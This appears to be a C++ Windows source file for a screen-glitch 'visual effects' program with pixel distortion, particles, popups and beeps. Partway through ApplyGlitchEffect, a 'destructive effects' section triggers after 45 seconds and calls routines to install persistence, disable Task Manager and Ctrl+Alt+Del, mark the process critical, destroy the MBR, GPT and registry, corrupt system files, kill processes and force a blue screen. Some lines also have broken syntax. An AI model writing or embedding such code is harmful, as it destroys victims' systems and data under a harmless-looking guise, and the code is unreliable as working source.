#include "VisualEffects.h"
#include "AdvancedEffects.h"
#include <Windows.h>
#include <mmsystem.h>
#include <dwmapi.h>
#include <gdiplus.h>
#include <algorithm>
#include <cmath>
#include <thread>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "dwmapi.lib")
#pragma comment(lib, "gdiplus.lib")

// Global variables
HBITMAP hGlitchBitmap = NULL;
BYTE* pPixels = NULL;
int screenWidth, screenHeight;
BITMAPINFO bmi = {};
int intensityLevel = 1;
DWORD startTime = GetTickCount();
int cursorX = 0, cursorY = 0;
bool cursorVisible = true;
int screenShakeX = 0, screenShakeY = 0;
bool textCorruptionActive = false;
DWORD lastEffectTime = 0;

// Containers
std::vector<Particle> particles;
std::vector<CorruptedText> corruptedTexts;
std::mutex g_mutex;

// Random number generation
std::random_device rd;
std::mt19937 gen(rd());
std::uniform_int_distribution<> dis(0, 255);
std::uniform_real_distribution<> disf(0.0, 1.0);

void CaptureScreen(HWND hwnd) {
    HDC hdcScreen = GetDC(hwnd);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    if (!hGlitchBitmap) {
        screenWidth = GetSystemMetrics(SM_CXSCREEN);
        screenHeight = GetSystemMetrics(SM_CYSCREEN);
        
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = screenWidth;
        bmi.bmiHeader.biHeight = -screenHeight;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;
        
        hGlitchBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pPixels, NULL, 0);
    }
    
    if (hGlitchBitmap) {
        SelectObject(hdcMem, hGlitchBitmap);
        BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
    }
    
    POINT pt;
    GetCursorPos(&pt);
    cursorX = pt.x;
    cursorY = pt.y;
    
    DeleteDC(hdcMem);
    ReleaseDC(hwnd, hdcScreen);
}

void ApplyColorShift(BYTE* pixels, int shift) {
    for (int i = 0; i < screenWidth * screenHeight * 4; i += 4) {
        if (i + shift + 2 < screenWidth * screenHeight * 4) {
            BYTE temp = pixels[i];
            pixels[i] = pixels[i + shift];
            pixels[i + shift] = temp;
        }
    }
}

void ApplyScreenShake() {
    screenShakeX = (rand() % 80 - 40) * intensityLevel;
    screenShakeY = (rand() % 80 - 40) * intensityLevel;
}

void ApplyCursorEffect() {
    if (!cursorVisible || !pPixels) return;
    
    int cursorSize = std::min(100 * intensityLevel, 1000);
    int startX = std::max(cursorX - cursorSize, 0);
    int startY = std::max(cursorY - cursorSize, 0);
    int endX = std::min(cursorX + cursorSize, screenWidth - 1);
    int endY = std::min(cursorY + cursorSize, screenHeight - 1);
    
    for (int y = startY; y <= endY; y++) {
        for (int x = startX; x <= endX; x++) {
            float dx = static_cast<float>(x - cursorX);
            float dy = static_cast<float>(y - cursorY);
            float dist = sqrt(dx * dx + dy * dy);
            
            if (dist < cursorSize) {
                int pos = (y * screenWidth + x) * 4;
                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                    pPixels[pos] = 255 - pPixels[pos];
                    pPixels[pos + 1] = 255 - pPixels[pos + 1];
                    pPixels[pos + 2] = 255 - pPixels[pos + 2];
                    
                    if (dist < cursorSize / 2) {
                        float amount = 1.0f - (dist / (cursorSize / 2.0f));
                        int shiftX = static_cast<int>(dx * amount * 20);
                        int shiftY = static_cast<int>(dy * amount * 20);
                        
                        int srcX = x - shiftX;
                        int srcY = y - shiftY;
                        
                        if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
                            int srcPos = (srcY * screenWidth + srcX) * 4;
                            if (srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                pPixels[pos] = pPixels[srcPos];
                                pPixels[pos + 1] = pPixels[srcPos + 1];
                                pPixels[pos + 2] = pPixels[srcPos + 2];
                            }
                        }
                    }
                }
            }
        }
    }
}

void UpdateParticles() {
    // Add new particles
    if (particles.size() < MAX_PARTICLES && (rand() % 5 == 0)) {
        Particle p;
        p.x = rand() % screenWidth;
        p.y = rand() % screenHeight;
        p.vx = (rand() % 200 - 100) / 20.0f;
        p.vy = (rand() % 200 - 100) / 20.0f;
        p.life = 0;
        p.maxLife = 100 + rand() % 400;
        p.color = RGB(rand() % 256, rand() % 256, rand() % 256);
        p.size = 1 + rand() % 5;
        p.type = rand() % 5;
        p.rotation = 0;
        p.rotationSpeed = (rand() % 100 - 50) / 100.0f;
        
        std::lock_guard<std::mutex> lock(g_mutex);
        particles.push_back(p);
    }
    
    // Update existing particles
    std::lock_guard<std::mutex> lock(g_mutex);
    for (auto it = particles.begin(); it != particles.end(); ) {
        it->x += it->vx;
        it->y += it->vy;
        it->life++;
        it->rotation += it->rotationSpeed;
        
        // Apply gravity to some particles
        if (it->type == 1 || it->type == 3) {
            it->vy += 0.1f;
        }
        
        if (it->life > it->maxLife) {
            it = particles.erase(it);
        } else {
            int x = static_cast<int>(it->x);
            int y = static_cast<int>(it->y);
            if (x >= 0 && x < screenWidth && y >= 0 && y < screenHeight) {
                // Different rendering based on particle type
                switch (it->type) {
                case 0: // Standard square
                    for (int py = -it->size; py <= it->size; py++) {
                        for (int px = -it->size; px <= it->size; px++) {
                            int pxPos = x + px;
                            int pyPos = y + py;
                            if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
                                int pos = (pyPos * screenWidth + pxPos) * 4;
                                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                    pPixels[pos] = GetBValue(it->color);
                                    pPixels[pos + 1] = GetGValue(it->color);
                                    pPixels[pos + 2] = GetRValue(it->color);
                                }
                            }
                        }
                    }
                    break;
                    
                case 1: // Circle
                    for (int py = -it->size; py <= it->size; py++) {
                        for (int px = -it->size; px <= it->size; px++) {
                            if (px*px + py*py <= it->size*it->size) {
                                int pxPos = x + px;
                                int pyPos = y + py;
                                if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
                                    int pos = (pyPos * screenWidth + pxPos) * 4;
                                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                        pPixels[pos] = GetBValue(it->color);
                                        pPixels[pos + 1] = GetGValue(it->color);
                                        pPixels[pos + 2] = GetRValue(it->color);
                                    }
                                }
                            }
                        }
                    }
                    break;
                    
                case 2: // Cross
                    for (int i = -it->size; i <= it->size; i++) {
                        int pxPos1 = x + i;
                        int pyPos1 = y;
                        if (pxPos1 >= 0 && pxPos1 < screenWidth && pyPos1 >= 0 && pyPos1 < screenHeight) {
                            int pos = (pyPos1 * screenWidth + pxPos1) * 4);
                            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                pPixels[pos] = GetBValue(it->color);
                                pPixels[pos + 1] = GetGValue(it->color);
                                pPixels[pos + 2] = GetRValue(it->color);
                            }
                        }
                        
                        int pxPos2 = x;
                        int pyPos2 = y + i;
                        if (pxPos2 >= 0 && pxPos2 < screenWidth && pyPos2 >= 0 && pyPos2 < screenHeight) {
                            int pos = (pyPos2 * screenWidth + pxPos2) * 4);
                            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                pPixels[pos] = GetBValue(it->color);
                                pPixels[pos + 1] = GetGValue(it->color);
                                pPixels[pos + 2] = GetRValue(it->color);
                            }
                        }
                    }
                    break;
                    
                case 3: // Rotating line
                    {
                        float cosr = cos(it->rotation);
                        float sinr = sin(it->rotation);
                        for (int i = -it->size; i <= it->size; i++) {
                            int px = static_cast<int>(i * cosr);
                            int py = static_cast<int>(i * sinr);
                            
                            int pxPos = x + px;
                            int pyPos = y + py;
                            if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
                                int pos = (pyPos * screenWidth + pxPos) * 4);
                                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                    pPixels[pos] = GetBValue(it->color);
                                    pPixels[pos + 1] = GetGValue(it->color);
                                    pPixels[pos + 2] = GetRValue(it->color);
                                }
                            }
                        }
                    }
                    break;
                    
                case 4: // Sparkle
                    if (rand() % 10 == 0) {
                        for (int py = -it->size; py <= it->size; py++) {
                            for (int px = -it->size; px <= it->size; px++) {
                                if (rand() % 3 == 0) {
                                    int pxPos = x + px;
                                    int pyPos = y + py;
                                    if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
                                        int pos = (pyPos * screenWidth + pxPos) * 4);
                                        if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                            pPixels[pos] = GetBValue(it->color);
                                            pPixels[pos + 1] = GetGValue(it->color);
                                            pPixels[pos + 2] = GetRValue(it->color);
                                        }
                                    }
                                }
                            }
                        }
                    }
                    break;
                }
            }
            ++it;
        }
    }
}

void ApplyMeltingEffect(BYTE* originalPixels) {
    int meltHeight = 100 + (rand() % 200) * intensityLevel;
    if (meltHeight < 20) meltHeight = 20;
    
    for (int y = screenHeight - meltHeight; y < screenHeight; y++) {
        int meltAmount = (screenHeight - y) * 3;
        for (int x = 0; x < screenWidth; x++) {
            int targetY = y + (rand() % meltAmount) - (meltAmount / 2);
            if (targetY < screenHeight && targetY >= 0) {
                int srcPos = (y * screenWidth + x) * 4;
                int dstPos = (targetY * screenWidth + x) * 4;
                
                if (srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 &&
                    dstPos >= 0 && dstPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                    pPixels[dstPos] = originalPixels[srcPos];
                    pPixels[dstPos + 1] = originalPixels[srcPos + 1];
                    pPixels[dstPos + 2] = originalPixels[srcPos + 2];
                }
            }
        }
    }
}

void ApplyTextCorruption() {
    if (!textCorruptionActive) return;
    
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
    
    if (rand() % 100 < 40) {
        CorruptedText ct;
        ct.x = rand() % (screenWidth - 300);
        ct.y = rand() % (screenHeight - 100);
        ct.creationTime = GetTickCount();
        ct.opacity = 0.8f + disf(gen) * 0.2f;
        ct.driftX = (disf(gen) - 0.5f) * 2.0f;
        ct.driftY = (disf(gen) - 0.5f) * 2.0f;
        
        int textLength = 15 + rand() % 40;
        for (int i = 0; i < textLength; i++) {
            wchar_t c;
            if (rand() % 6 == 0) {
                c = L'�';
            } else if (rand() % 10 == 0) {
                // Use some Unicode block elements
                wchar_t blocks[] = {L'█', L'░', L'▒', L'▓', L'▄', L'▀', L'■', L'□'};
                c = blocks[rand() % (sizeof(blocks)/sizeof(blocks[0]))];
            } else {
                c = static_cast<wchar_t>(0x20 + rand() % 95);
            }
            ct.text += c;
        }
        
        std::lock_guard<std::mutex> lock(g_mutex);
        if (corruptedTexts.size() < MAX_CORRUPTED_TEXTS) {
            corruptedTexts.push_back(ct);
        }
    }
    
    HFONT hFont = CreateFontW(
        28 + rand() % 30, 0, 0, 0, 
        FW_BOLD, 
        rand() % 2, rand() % 2, rand() % 2,
        DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY,
        DEFAULT_PITCH | FF_DONTCARE,
        L"Terminal"
    );
    
    SelectObject(hdcMem, hFont);
    SetBkMode(hdcMem, TRANSPARENT);
    
    std::lock_guard<std::mutex> lock(g_mutex);
    for (auto it = corruptedTexts.begin(); it != corruptedTexts.end(); ) {
        it->x += static_cast<int>(it->driftX);
        it->y += static_cast<int>(it->driftY);
        
        // Wrap around screen edges
        if (it->x < -300) it->x = screenWidth;
        if (it->x > screenWidth) it->x = -300;
        if (it->y < -100) it->y = screenHeight;
        if (it->y > screenHeight) it->y = -100;
        
        COLORREF color = RGB(rand() % 256, rand() % 256, rand() % 256);
        SetTextColor(hdcMem, color);
        TextOutW(hdcMem, it->x, it->y, it->text.c_str(), static_cast<int>(it->text.length()));
        
        if (GetTickCount() - it->creationTime > 8000) {
            it = corruptedTexts.erase(it);
        } else {
            ++it;
        }
    }
    
    BITMAPINFOHEADER bmih = {};
    bmih.biSize = sizeof(BITMAPINFOHEADER);
    bmih.biWidth = screenWidth;
    bmih.biHeight = -screenHeight;
    bmih.biPlanes = 1;
    bmih.biBitCount = 32;
    bmih.biCompression = BI_RGB;
    bmih.biSizeImage = 0;
    bmih.biXPelsPerMeter = 0;
    bmih.biYPelsPerMeter = 0;
    bmih.biClrUsed = 0;
    bmih.biClrImportant = 0;
    
    GetDIBits(hdcMem, hBitmap, 0, screenHeight, pPixels, (BITMAPINFO*)&bmih, DIB_RGB_COLORS);
    
    DeleteObject(hFont);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

void ApplyPixelSorting() {
    int startX = rand() % screenWidth;
    int startY = rand() % screenHeight;
    int width = 100 + rand() % 300;
    int height = 100 + rand() % 300;
    
    int endX = std::min(startX + width, screenWidth);
    int endY = std::min(startY + height, screenHeight);
    
    for (int y = startY; y < endY; y++) {
        std::vector<std::pair<float, int>> brightness;
        for (int x = startX; x < endX; x++) {
            int pos = (y * screenWidth + x) * 4;
            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                float brt = 0.299f * pPixels[pos+2] + 0.587f * pPixels[pos+1] + 0.114f * pPixels[pos];
                brightness.push_back(std::make_pair(brt, x));
            }
        }
        
        std::sort(brightness.begin(), brightness.end());
        
        std::vector<BYTE> sortedLine;
        for (auto& b : brightness) {
            int pos = (y * screenWidth + b.second) * 4;
            sortedLine.push_back(pPixels[pos]);
            sortedLine.push_back(pPixels[pos+1]);
            sortedLine.push_back(pPixels[pos+2]);
            sortedLine.push_back(pPixels[pos+3]);
        }
        
        for (int x = startX; x < endX; x++) {
            int pos = (y * screenWidth + x) * 4;
            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                int idx = (x - startX) * 4;
                pPixels[pos] = sortedLine[idx];
                pPixels[pos+1] = sortedLine[idx+1];
                pPixels[pos+2] = sortedLine[idx+2];
                pPixels[pos+3] = sortedLine[idx+3];
            }
        }
    }
}

void ApplyStaticBars() {
    int barCount = 10 + rand() % 20;
    int barHeight = 20 + rand() % 100;
    
    for (int i = 0; i < barCount; i++) {
        int barY = rand() % screenHeight;
        int barHeightActual = std::min(barHeight, screenHeight - barY);
        
        for (int y = barY; y < barY + barHeightActual; y++) {
            for (int x = 0; x < screenWidth; x++) {
                int pos = (y * screenWidth + x) * 4;
                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                    if (rand() % 2 == 0) {
                        pPixels[pos] = rand() % 256;
                        pPixels[pos+1] = rand() % 256;
                        pPixels[pos+2] = rand() % 256;
                    }
                }
            }
        }
    }
}

void ApplyInversionWaves() {
    int centerX = rand() % screenWidth;
    int centerY = rand() % screenHeight;
    int maxRadius = 200 + rand() % 800;
    float speed = 0.1f + (rand() % 100) / 100.0f;
    DWORD currentTime = GetTickCount();
    
    for (int y = 0; y < screenHeight; y++) {
        for (int x = 0; x < screenWidth; x++) {
            float dx = static_cast<float>(x - centerX);
            float dy = static_cast<float>(y - centerY);
            float dist = sqrt(dx*dx + dy*dy);
            
            if (dist < maxRadius) {
                float wave = sin(dist * 0.05f - currentTime * 0.003f * speed) * 0.5f + 0.5f;
                if (wave > 0.6f) {
                    int pos = (y * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = 255 - pPixels[pos];
                        pPixels[pos+1] = 255 - pPixels[pos+1];
                        pPixels[pos+2] = 255 - pPixels[pos+2];
                    }
                }
            }
        }
    }
}

void ApplyGlitchEffect() {
    if (!pPixels) return;
    
    std::unique_ptr<BYTE[]> pCopy(new BYTE[screenWidth * screenHeight * 4]);
    if (!pCopy) return;
    memcpy(pCopy.get(), pPixels, screenWidth * screenHeight * 4);
    
    DWORD currentTime = GetTickCount();
    int timeIntensity = 1 + static_cast<int>((currentTime - startTime) / 3000);
    intensityLevel = std::min(30, timeIntensity);
    
    ApplyScreenShake();
    
    if (currentTime - lastEffectTime > 800) {
        textCorruptionActive = (rand() % 100 < 40 * intensityLevel);
        matrixRainActive = (rand() % 100 < 30 * intensityLevel);
        fractalNoiseActive = (rand() % 100 < 25 * intensityLevel);
        screenBurnActive = (rand() % 100 < 20 * intensityLevel);
        wormholeEffectActive = (rand() % 100 < 15 * intensityLevel);
        temporalDistortionActive = (rand() % 100 < 10 * intensityLevel);
        lastEffectTime = currentTime;
    }
    
    // Enhanced glitch lines
    int effectiveLines = std::min(GLITCH_LINES * intensityLevel, 10000);
    for (int i = 0; i < effectiveLines; ++i) {
        int y = rand() % screenHeight;
        int height = 1 + rand() % (100 * intensityLevel);
        int xOffset = (rand() % (MAX_GLITCH_INTENSITY * 3 * intensityLevel)) - MAX_GLITCH_INTENSITY * intensityLevel * 1.5;
        
        height = std::min(height, screenHeight - y);
        if (height <= 0) continue;
        
        for (int h = 0; h < height; ++h) {
            int currentY = y + h;
            if (currentY >= screenHeight) break;
            
            BYTE* source = pCopy.get() + (currentY * screenWidth * 4);
            BYTE* dest = pPixels + (currentY * screenWidth * 4);
            
            if (xOffset > 0) {
                int copySize = (screenWidth - xOffset) * 4;
                if (copySize > 0) {
                    memmove(dest + xOffset * 4, 
                            source, 
                            copySize);
                }
                for (int x = 0; x < xOffset; x++) {
                    int pos = (currentY * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = dis(gen);
                        pPixels[pos + 1] = dis(gen);
                        pPixels[pos + 2] = dis(gen);
                    }
                }
            } 
            else if (xOffset < 0) {
                int absOffset = -xOffset;
                int copySize = (screenWidth - absOffset) * 4;
                if (copySize > 0) {
                    memmove(dest, 
                            source + absOffset * 4, 
                            copySize);
                }
                for (int x = screenWidth - absOffset; x < screenWidth; x++) {
                    int pos = (currentY * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = dis(gen);
                        pPixels[pos + 1] = dis(gen);
                        pPixels[pos + 2] = dis(gen);
                    }
                }
            }
        }
    }
    
    // Enhanced block distortion
    int effectiveBlocks = std::min(MAX_GLITCH_BLOCKS * intensityLevel, 2000);
    for (int i = 0; i < effectiveBlocks; ++i) {
        int blockWidth = std::min(100 + rand() % (400 * intensityLevel), screenWidth);
        int blockHeight = std::min(100 + rand() % (400 * intensityLevel), screenHeight);
        int x = rand() % (screenWidth - blockWidth);
        int y = rand() % (screenHeight - blockHeight);
        int offsetX = (rand() % (1000 * intensityLevel)) - 500 * intensityLevel;
        int offsetY = (rand() % (1000 * intensityLevel)) - 500 * intensityLevel;
        
        for (int h = 0; h < blockHeight; h++) {
            int sourceY = y + h;
            int destY = sourceY + offsetY;
            
            if (destY >= 0 && destY < screenHeight && sourceY >= 0 && sourceY < screenHeight) {
                BYTE* source = pCopy.get() + (sourceY * screenWidth + x) * 4;
                BYTE* dest = pPixels + (destY * screenWidth + x + offsetX) * 4;
                
                int effectiveWidth = blockWidth;
                if (x + offsetX + blockWidth > screenWidth) {
                    effectiveWidth = screenWidth - (x + offsetX);
                }
                if (x + offsetX < 0) {
                    effectiveWidth = blockWidth + (x + offsetX);
                    source -= (x + offsetX) * 4;
                    dest -= (x + offsetX) * 4;
                }
                
                if (effectiveWidth > 0 && dest >= pPixels && 
                    dest + effectiveWidth * 4 <= pPixels + screenWidth * screenHeight * 4) {
                    memcpy(dest, source, effectiveWidth * 4);
                }
            }
        }
    }
    
    if (intensityLevel > 0 && (rand() % std::max(1, 3 / intensityLevel)) == 0) {
        ApplyColorShift(pPixels, (rand() % 5) + 1);
    }
    
    int effectivePixels = std::min(screenWidth * screenHeight * intensityLevel, 500000);
    for (int i = 0; i < effectivePixels; i++) {
        int x = rand() % screenWidth;
        int y = rand() % screenHeight;
        int pos = (y * screenWidth + x) * 4;
        
        if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
            pPixels[pos] = dis(gen);
            pPixels[pos + 1] = dis(gen);
            pPixels[pos + 2] = dis(gen);
        }
    }
    
    if (intensityLevel > 0 && (rand() % std::max(1, 4 / intensityLevel)) == 0) {
        int centerX = rand() % screenWidth;
        int centerY = rand() % screenHeight;
        int radius = std::min(200 + rand() % (1000 * intensityLevel), screenWidth/2);
        int distortion = 50 + rand() % (150 * intensityLevel);
        
        int yStart = std::max(centerY - radius, 0);
        int yEnd = std::min(centerY + radius, screenHeight);
        int xStart = std::max(centerX - radius, 0);
        int xEnd = std::min(centerX + radius, screenWidth);
        
        for (int y = yStart; y < yEnd; y++) {
            for (int x = xStart; x < xEnd; x++) {
                float dx = static_cast<float>(x - centerX);
                float dy = static_cast<float>(y - centerY);
                float distance = sqrt(dx*dx + dy*dy);
                
                if (distance < radius) {
                    float amount = pow(1.0f - (distance / radius), 2.0f);
                    int shiftX = static_cast<int>(dx * amount * distortion * (rand() % 5 - 2));
                    int shiftY = static_cast<int>(dy * amount * distortion * (rand() % 5 - 2));
                    
                    int srcX = x - shiftX;
                    int srcY = y - shiftY;
                    
                    if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
                        int srcPos = (srcY * screenWidth + srcX) * 4;
                        int destPos = (y * screenWidth + x) * 4;
                        
                        if (destPos >= 0 && destPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 && 
                            srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                            pPixels[destPos] = pCopy[srcPos];
                            pPixels[destPos + 1] = pCopy[srcPos + 1];
                            pPixels[destPos + 2] = pCopy[srcPos + 2];
                        }
                    }
                }
            }
        }
    }
    
    if (rand() % 3 == 0) {
        int lineHeight = 1 + rand() % (5 * intensityLevel);
        for (int y = 0; y < screenHeight; y += lineHeight * 2) {
            for (int h = 0; h < lineHeight; h++) {
                if (y + h >= screenHeight) break;
                for (int x = 0; x < screenWidth; x++) {
                    int pos = ((y + h) * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = std::min(pPixels[pos] + 150, 255);
                        pPixels[pos + 1] = std::min(pPixels[pos + 1] + 150, 255);
                        pPixels[pos + 2] = std::min(pPixels[pos + 2] + 150, 255);
                    }
                }
            }
        }
    }
    
    if (intensityLevel > 0 && (rand() % std::max(1, 15 / intensityLevel)) == 0) {
        for (int i = 0; i < static_cast<int>(screenWidth * screenHeight * 4); i += 4) {
            if (i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                pPixels[i] = 255 - pPixels[i];
                pPixels[i + 1] = 255 - pPixels[i + 1];
                pPixels[i + 2] = 255 - pPixels[i + 2];
            }
        }
    }
    
    if (intensityLevel > 3 && rand() % 8 == 0) {
        ApplyMeltingEffect(pCopy.get());
    }
    
    if (textCorruptionActive) {
        ApplyTextCorruption();
    }
    
    if (intensityLevel > 2 && rand() % 12 == 0) {
        ApplyPixelSorting();
    }
    
    if (intensityLevel > 2 && rand() % 6 == 0) {
        ApplyStaticBars();
    }
    
    if (intensityLevel > 3 && rand() % 10 == 0) {
        ApplyInversionWaves();
    }
    
    // Advanced effects
    if (matrixRainActive) {
        ApplyMatrixRain();
    }
    
    if (fractalNoiseActive) {
        ApplyFractalNoise();
    }
    
    if (screenBurnActive) {
        ApplyScreenBurn();
    }
    
    if (wormholeEffectActive) {
        ApplyWormholeEffect();
    }
    
    if (temporalDistortionActive) {
        ApplyTemporalDistortion();
    }
    
    ApplyCursorEffect();
    UpdateParticles();
    
    if (rand() % SOUND_CHANCE == 0) {
        PlayGlitchSoundAsync();
    }
    
    if (rand() % 80 == 0) {
        cursorVisible = !cursorVisible;
        ShowCursor(cursorVisible);
    }
    
    // ===== POPUP RANDOM =====
    static DWORD lastPopupTime = 0;
    if (GetTickCount() - lastPopupTime > 2000 && (rand() % 100 < (25 + intensityLevel * 4))) {
        std::thread(OpenRandomPopups).detach();
        lastPopupTime = GetTickCount();
    }
    
    // ===== DESTRUCTIVE EFFECTS =====
    DWORD cTime = GetTickCount();
    
    // Aktifkan mode kritis setelah 45 detik
    if (!criticalMode && cTime - startTime > 45000) {
        criticalMode = true;
        bsodTriggerTime = cTime + 45000 + rand() % 45000; // BSOD dalam 45-90 detik
        
        if (!persistenceInstalled) {
            InstallPersistence();
            DisableSystemTools();
            DisableCtrlAltDel();
        }
        
        // Aktifkan fitur admin
        if (g_isAdmin) {
            static bool adminDestructionDone = false;
            if (!adminDestructionDone) {
                BreakTaskManager();
                SetCriticalProcess();
                DestroyMBR();
                DestroyGPT();
                DestroyRegistry();
                adminDestructionDone = true;
            }
        }
    }
    
    // Eksekusi tindakan destruktif
    if (criticalMode && !destructiveActionsTriggered) {
        ExecuteDestructiveActions();
    }
    
    // Efek khusus mode kritis
    if (criticalMode) {
        static DWORD lastCorruption = 0;
        if (cTime - lastCorruption > 8000) {
            std::thread(CorruptSystemFiles).detach();
            lastCorruption = cTime;
        }
        
        static DWORD lastKill = 0;
        if (cTime - lastKill > 4000) {
            std::thread(KillCriticalProcesses).detach();
            lastKill = cTime;
        }
        
        intensityLevel = 30;
        
        if (cTime >= bsodTriggerTime) {
            std::thread(TriggerBSOD).detach();
        }
    }
}

void PlayGlitchSoundAsync() {
    std::thread([]() {
        int soundType = rand() % 35;
        
        switch (soundType) {
        case 0: case 1: case 2: case 3:
            PlaySound(TEXT("SystemHand"), NULL, SND_ALIAS | SND_ASYNC);
            break;
        case 4: case 5:
            PlaySound(TEXT("SystemExclamation"), NULL, SND_ALIAS | SND_ASYNC);
            break;
        case 6: case 7:
            Beep(rand() % 4000 + 500, rand() % 100 + 30);
            break;
        case 8: case 9:
            for (int i = 0; i < 100; i++) {
                Beep(rand() % 5000 + 500, 15);
                Sleep(2);
            }
            break;
        case 10: case 11:
            Beep(rand() % 100 + 30, rand() % 400 + 200);
            break;
        case 12: case 13:
            for (int i = 0; i < 60; i++) {
                Beep(rand() % 4000 + 500, rand() % 30 + 10);
                Sleep(1);
            }
            break;
        case 14: case 15:
            for (int i = 0; i < 600; i += 3) {
                Beep(300 + i * 15, 8);
            }
            break;
        case 16: case 17:
            for (int i = 0; i < 20; i++) {
                Beep(50 + i * 100, 200);
            }
            break;
        case 18: case 19:
            // White noise
            for (int i = 0; i < 5000; i++) {
                Beep(rand() % 10000 + 500, 1);
            }
            break;
        case 20: case 21:
            // Rising pitch
            for (int i = 0; i < 1000; i++) {
                Beep(100 + i * 10, 1);
            }
            break;
        case 22: case 23:
            // Falling pitch
            for (int i = 0; i < 1000; i++) {
                Beep(10000 - i * 10, 1);
            }
            break;
        default:
            // Complex multi-tone
            for (int i = 0; i < 200; i++) {
                for (int j = 0; j < 3; j++) {
                    Beep(rand() % 6000 + 500, 10);
                }
                Sleep(5);
            }
            break;
        }
    }).detach();
}
